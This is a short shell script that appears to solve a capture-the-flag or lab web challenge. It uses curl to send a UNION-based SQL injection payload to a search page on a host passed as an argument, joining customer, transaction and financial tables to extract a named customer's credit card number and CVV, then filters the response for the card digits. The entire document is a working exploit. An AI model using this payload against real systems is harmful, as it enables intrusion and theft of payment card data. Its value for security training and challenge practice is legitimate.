#!/bin/sh

# Solution was available in the source of the page itself.

curl 'http://'$1'/~challenge3/?title=&desc=&author=RANOMDON&n=1+union+select+customers.id%2Ccustomers.first_name%2Ctransactions.fininfo_id%2Cfininfo.fin_cc_number%2Cfininfo.fin_cc_cvv+from+transactions+JOIN+customers+ON+transactions.customer_id+%3D+customers.id+JOIN+fininfo+on+fininfo.id+%3D+transactions.fininfo_id+WHERE+customers.first_name+%3D+%27John%27+and+customers.last_name+%3D+%27Doe%27&action=advsearch' -s >.tmp

sed -n '/by /p' .tmp > .tmp2
grep -Eo '[0-9]{5,20}' .tmp2
rm .tmp .tmp2

